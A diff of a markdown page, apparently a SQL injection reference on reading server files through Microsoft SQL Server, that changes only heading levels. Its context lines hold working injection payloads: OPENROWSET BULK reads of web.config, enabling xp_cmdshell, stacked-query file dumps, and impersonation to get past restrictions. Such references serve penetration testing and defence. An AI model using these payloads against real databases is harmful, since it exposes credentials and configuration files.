@@ -7,11 +7,9 @@ tags: ["file operations", "openrowset", "bulk", "xp_cmdshell"]
 lastUpdated: 2025-12-15
 ---
 
-## Reading Files
-
 Microsoft SQL Server provides several methods to read files from the server's filesystem, which can be exploited during SQL injection attacks if the database user has sufficient privileges.
 
-### Prerequisites
+## Prerequisites
 
 To read files from MSSQL, you typically need one of the following:
 
@@ -19,11 +17,11 @@ To read files from MSSQL, you typically need one of the following:
 2. `ADMINISTER BULK OPERATIONS` permission (for OPENROWSET BULK)
 3. Ad hoc distributed queries enabled (for some OPENROWSET methods)
 
-### OPENROWSET BULK
+## OPENROWSET BULK
 
 The most versatile method for reading files. Reads file contents directly into a result set.
 
-#### Reading Text Files
+### Reading Text Files
 
 ```sql
 -- Read entire file as single text value (SINGLE_CLOB for ASCII)
@@ -33,7 +31,7 @@ SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CL
 SELECT * FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_NCLOB) AS Contents;
 ```
 
-#### Reading Binary Files
+### Reading Binary Files
 
 ```sql
 -- Read binary file (SINGLE_BLOB)
@@ -44,7 +42,7 @@ SELECT CONVERT(VARCHAR(MAX), BulkColumn, 2)
 FROM OPENROWSET(BULK 'C:\path\to\binary', SINGLE_BLOB) AS Contents;
 ```
 
-#### OPENROWSET BULK Options
+### OPENROWSET BULK Options
 
 | Option       | Description                          | Use Case           |
 | ------------ | ------------------------------------ | ------------------ |
@@ -53,7 +51,7 @@ FROM OPENROWSET(BULK 'C:\path\to\binary', SINGLE_BLOB) AS Contents;
 | SINGLE_BLOB  | Binary data, single row/column       | Executables, SAM   |
 | FORMATFILE   | Custom format for structured parsing | CSV, fixed-width   |
 
-### Using xp_cmdshell
+## Using xp_cmdshell
 
 When `xp_cmdshell` is enabled, use OS commands to read files:
 
@@ -68,7 +66,7 @@ EXEC xp_cmdshell 'powershell -c "Get-Content C:\inetpub\wwwroot\web.config"';
 EXEC xp_cmdshell 'powershell -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes(''C:\path\to\file''))"';
 ```
 
-#### Enabling xp_cmdshell
+### Enabling xp_cmdshell
 
 ```sql
 -- Enable xp_cmdshell (requires sysadmin)
@@ -78,9 +76,9 @@ EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 ```
 
-### File System Functions
+## File System Functions
 
-#### xp_fileexist - Check File Existence
+### xp_fileexist - Check File Existence
 
 ```sql
 -- Returns 1 if file exists, 0 otherwise
@@ -92,7 +90,7 @@ SELECT @exists;
 EXEC xp_fileexist 'C:\Windows\System32\drivers\etc\hosts';
 ```
 
-#### xp_dirtree - List Directory Contents
+### xp_dirtree - List Directory Contents
 
 ```sql
 -- List files and subdirectories
@@ -107,7 +105,7 @@ INSERT INTO #dirs EXEC xp_dirtree 'C:\inetpub\wwwroot\', 1, 1;
 SELECT * FROM #dirs WHERE isfile = 1;
 ```
 
-### OLE Automation (sp_OACreate)
+## OLE Automation (sp_OACreate)
 
 Use FileSystemObject for file operations:
 
@@ -128,7 +126,7 @@ EXEC sp_OADestroy @file;
 EXEC sp_OADestroy @fso;
 ```
 
-### Important Target Files
+## Important Target Files
 
 | File Path                                                                                    | Description                         |
 | -------------------------------------------------------------------------------------------- | ----------------------------------- |
@@ -151,7 +149,7 @@ EXEC sp_OADestroy @fso;
 
 Verify paths on the target system using directory listing (`xp_dirtree`, `xp_cmdshell 'dir'`) before attempting file reads.
 
-### SQL Injection Examples
+## SQL Injection Examples
 
 ```sql
 -- Read file via UNION injection
@@ -167,7 +165,7 @@ Verify paths on the target system using directory listing (`xp_dirtree`, `xp_cmd
 '; EXEC xp_cmdshell 'type C:\inetpub\wwwroot\web.config'--
 ```
 
-### Checking Permissions
+## Checking Permissions
 
 ```sql
 -- Check if user is sysadmin
@@ -183,9 +181,9 @@ EXEC sp_configure 'xp_cmdshell';
 EXEC sp_configure 'Ole Automation Procedures';
 ```
 
-### Bypassing Restrictions
+## Bypassing Restrictions
 
-#### When OPENROWSET BULK is Blocked
+### When OPENROWSET BULK is Blocked
 
 ```sql
 -- Try using xp_cmdshell instead
@@ -197,7 +195,7 @@ EXEC sp_OACreate 'Scripting.FileSystemObject', @fso OUTPUT;
 -- ...
 ```
 
-#### Reading Files as Different User
+### Reading Files as Different User
 
 ```sql
 -- Use EXECUTE AS to impersonate (if permitted)
@@ -206,7 +204,7 @@ SELECT * FROM OPENROWSET(BULK 'C:\sensitive\file.txt', SINGLE_CLOB) AS x;
 REVERT;
 ```
 
-### Mitigation
+## Mitigation
 
 To prevent unauthorized file reading:
 
